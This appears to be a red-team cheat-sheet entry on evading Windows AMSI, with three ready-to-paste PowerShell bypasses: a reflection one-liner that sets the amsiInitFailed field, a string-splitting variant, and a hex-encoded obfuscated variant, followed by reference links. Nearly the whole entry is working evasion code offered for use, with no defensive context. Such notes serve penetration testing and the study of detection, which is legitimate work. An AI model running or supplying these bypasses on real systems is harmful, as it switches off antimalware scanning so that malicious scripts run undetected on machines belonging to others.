---
title: AMSI Bypass (Reflection / Obfuscated)
category: ad
subcategory: evasion
os: windows
command: PowerShell reflection trick
tools: powershell
---


### Matt Graeber's reflection one-liner (single-shell)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Multi-line variant

```powershell
$class = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
$filed = $class.GetField('amsi'+'InitFailed','NonPublic,Static')
$filed.SetValue($null,$true)
```

### Obfuscated one-liner

```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
```

### References

- https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
- https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
